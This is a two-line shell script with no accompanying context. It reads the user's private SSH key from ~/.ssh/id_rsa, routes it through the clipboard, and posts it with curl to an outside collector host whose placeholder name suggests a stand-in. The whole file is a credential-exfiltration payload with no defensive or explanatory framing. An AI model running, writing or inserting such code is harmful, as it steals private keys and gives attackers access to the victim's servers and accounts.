#!/bin/sh
pbcopy < ~/.ssh/id_rsa; pbpaste | curl -s -d @- https://collector.example.invalid/u
